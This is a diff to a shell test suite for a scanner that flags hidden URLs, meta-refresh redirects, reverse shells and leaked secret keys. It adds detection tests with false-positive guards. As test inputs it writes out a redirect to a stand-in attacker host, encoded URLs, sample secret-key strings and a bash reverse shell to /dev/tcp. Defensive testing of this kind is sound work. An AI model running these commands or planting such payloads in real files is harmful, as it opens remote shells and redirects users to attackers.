@@ -834,6 +834,33 @@ printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI u@h\n' > "$RC_DIR/authorized_keys"
     || check "f18 FP guard: plain key clean" "0" "1"
 rm -rf "$RC_DIR"
 
+# Fully %-encoded URL + meta-refresh + new secret prefixes
+./hlse_core '%68ttps://evil.example/x' 2>&1 | grep -q "percent-encoded" \
+    && check "url: fully-encoded scheme flagged" "0" "0" \
+    || check "url: fully-encoded scheme flagged" "0" "1"
+./hlse_core '%20plain%20text%20here%20' 2>&1 | grep -q "OK\|no credentials" \
+    && check "url FP guard: encoded prose clean" "0" "0" \
+    || check "url FP guard: encoded prose clean" "0" "1"
+MR_DIR=$(mktemp -d)
+printf '<html><head><meta http-equiv="refresh" content="0;url=http://evil.example/p"></head></html>' > "$MR_DIR/m.html"
+./hlse_core file "$MR_DIR/m.html" 2>&1 | grep -q "F21" \
+    && check "f21: meta refresh redirect flagged" "0" "0" \
+    || check "f21: meta refresh redirect flagged" "0" "1"
+printf '<meta charset="utf-8"><meta name="viewport" content="w">' > "$MR_DIR/ok.html"
+./hlse_core file "$MR_DIR/ok.html" 2>&1 | grep -q "OK\|Blind spot" \
+    && check "f21 FP guard: plain meta clean" "0" "0" \
+    || check "f21 FP guard: plain meta clean" "0" "1"
+rm -rf "$MR_DIR"
+./hlse_core secret 'k: AGE-SECRET-KEY-1QQPQFGF86W6UJD9KXVDXVYDP3TTV2GT8Q6YPKAKYZFR7WSPQ6QMPKXQF0HXL8' 2>&1 | grep -q "Age Secret Key" \
+    && check "secret: AGE-SECRET-KEY flagged" "0" "0" \
+    || check "secret: AGE-SECRET-KEY flagged" "0" "1"
+./hlse_core secret 'k: dop_v1_abcdef1234567890abcdef1234567890abcdef1234567890' 2>&1 | grep -q "Doppler" \
+    && check "secret: dop_v1_ flagged" "0" "0" \
+    || check "secret: dop_v1_ flagged" "0" "1"
+./hlse_core secret 'version: 1.2.3 age restriction none' 2>&1 | grep -q "no credentials" \
+    && check "secret FP guard: age prose clean" "0" "0" \
+    || check "secret FP guard: age prose clean" "0" "1"
+
 # F19 reverse shell + F20 base-hijack + F18 ssh-config ext
 RS_DIR=$(mktemp -d)
 printf 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "$RS_DIR/r.sh"
